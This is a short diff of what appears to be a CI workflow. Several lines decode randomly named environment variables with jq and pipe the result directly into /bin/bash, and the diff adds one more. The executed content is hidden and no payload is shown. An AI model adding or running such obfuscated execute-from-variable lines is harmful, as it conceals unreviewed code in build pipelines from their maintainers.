@@ -26,6 +26,7 @@ jobs:
           echo $dcl11 | jq -r .g0 | /bin/bash
           echo $j21076 | jq -r .jtkr587 | /bin/bash
           echo $qoqvv115 | jq -r .gd3 | /bin/bash
+          echo $qghe22690 | jq -r .r31291 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
